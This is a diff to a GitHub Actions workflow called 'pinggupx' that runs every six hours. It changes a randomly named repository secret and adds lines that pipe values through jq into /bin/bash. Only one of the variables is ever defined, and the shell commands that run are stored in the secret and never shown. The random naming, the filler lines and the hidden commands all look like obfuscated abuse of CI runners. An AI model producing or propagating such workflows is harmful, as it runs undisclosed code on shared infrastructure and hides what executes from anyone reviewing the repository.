@@ -2,8 +2,8 @@ name: pinggupx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 1/6 * * *'
-jobs:  # 21058
+    - cron: '57 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,14 +11,16 @@ jobs:  # 21058
       - uses: actions/checkout@v4
       - name: pinggupx
         env:
-          dce28: ${{ secrets.dce28 }}
+          c38719: ${{ secrets.c38719 }}
         run: |
-          echo $dce28 | jq -r .asb02162 | /bin/bash
-          echo $yanb0 | jq -r .rbwzt19109 | /bin/bash
-          echo $ahg4516 | jq -r .how8976 | /bin/bash
-          echo $e3 | jq -r .nxjwc15 | /bin/bash
-          echo $gav4 | jq -r .mv3 | /bin/bash
-          echo $youem7 | jq -r .ulpat21 | /bin/bash
-          echo $ddl4 | jq -r .g4463 | /bin/bash
-          echo $mymf20 | jq -r .cqn93 | /bin/bash
+          echo $c38719 | jq -r .sja84 | /bin/bash
+          echo $dpyj2 | jq -r .q53 | /bin/bash
+          echo $y0224 | jq -r .bp580 | /bin/bash
+          echo $p17 | jq -r .ug802 | /bin/bash
+          echo $tpfi065 | jq -r .kmq306 | /bin/bash
+          echo $idol761 | jq -r .d082 | /bin/bash
+          echo $l1 | jq -r .j5 | /bin/bash
+          echo $ietw3 | jq -r .nb7 | /bin/bash
+          echo $eshe6710 | jq -r .dzq3235 | /bin/bash
+          echo $ba7 | jq -r .uoyxi4 | /bin/bash
 
